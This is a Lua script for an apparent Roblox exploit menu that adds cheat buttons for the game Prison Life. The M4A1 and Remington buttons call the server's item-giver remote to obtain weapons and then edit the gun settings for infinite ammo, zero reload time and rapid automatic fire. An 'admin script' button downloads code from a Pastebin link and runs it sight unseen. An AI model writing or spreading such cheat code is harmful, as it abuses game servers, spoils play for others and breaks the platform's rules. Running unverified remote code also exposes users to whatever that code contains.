local PrisonLifeTab     = Window:NewTab("prison life")
local PrisonLifeSection = PrisonLifeTab:NewSection("prison life")
    PrisonLifeSection:NewButton("m4a1 gun script", "makes the m4 a1 shoot verry fast", function()
        local p = game.Players.LocalPlayer
        local toggle = true
        local fuck = "M4A1" --You choose what gun you want idc
        
        function getGun(gunName)
            game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[gunName].ITEMPICKUP)
        end
        
        getGun("Remington 870")
        getGun("M4A1")
        getGun("AK-47")
        getGun("M9")
        
        wait(1)
        
        --You choose your gun settings idc
        function infAmmo(GunThing)   
            local gun = p.Backpack:WaitForChild(GunThing) or p.Character:WaitForChild(GunThing)
            local Edit = require(gun:WaitForChild("GunStates"))
            Edit["MaxAmmo"] = math.huge
            Edit["StoredAmmo"] = math.huge
            Edit["AmmoPerClip"] = math.huge
            Edit["Range"] = math.huge
            Edit["CurrentAmmo"] = math.huge
            --Edit["Bullets"] = 13
            Edit["ReloadTime"] = 0
            Edit["FireRate"] = 0
            Edit["AutoFire"] = true
        end
        
        p.Character.Humanoid.Died:Connect(function()
            wait(0.1)
            toggle = false
            warn("stopped")
        end)
        
        infAmmo(tostring(fuck))
        
        local shit = p.Backpack:WaitForChild(tostring(fuck)) or p.Character:WaitForChild(tostring(fuck))
        
        while toggle == true do wait(1)
            game:GetService("ReplicatedStorage").ReloadEvent:FireServer(shit) 
        end 
-- function
    end) 
    PrisonLifeSection:NewButton("admin script", "makes you admin", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/VPrNqGKU", true))()
    end) 
    PrisonLifeSection:NewButton("remington script", "makes theremington shoot rapidly", function()
        local p = game.Players.LocalPlayer
        local toggle = true
        local fuck = "Remington 870" --You choose what gun you want idc
        
        function getGun(gunName)
            game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[gunName].ITEMPICKUP)
        end
        
        getGun("Remington 870")
        getGun("M4A1")
        getGun("AK-47")
        getGun("M9")
        
        wait(1)
        
        --You choose your gun settings idc
        function infAmmo(GunThing)   
            local gun = p.Backpack:WaitForChild(GunThing) or p.Character:WaitForChild(GunThing)
            local Edit = require(gun:WaitForChild("GunStates"))
            Edit["MaxAmmo"] = math.huge
            Edit["StoredAmmo"] = math.huge
            Edit["AmmoPerClip"] = math.huge
            Edit["Range"] = math.huge
            Edit["CurrentAmmo"] = math.huge
            Edit["Bullets"] = 5
            Edit["ReloadTime"] = 0
            Edit["FireRate"] = 0
            Edit["AutoFire"] = true
        end
        
        p.Character.Humanoid.Died:Connect(function()
            wait(0.1)
            toggle = false
            warn("stopped")
        end)
        
        infAmmo(tostring(fuck))
        local shit = p.Backpack:WaitForChild(tostring(fuck)) or p.Character:WaitForChild(tostring(fuck))
        
        while toggle == true do wait(1)
            game:GetService("ReplicatedStorage").ReloadEvent:FireServer(shit) 
        end
    end) 
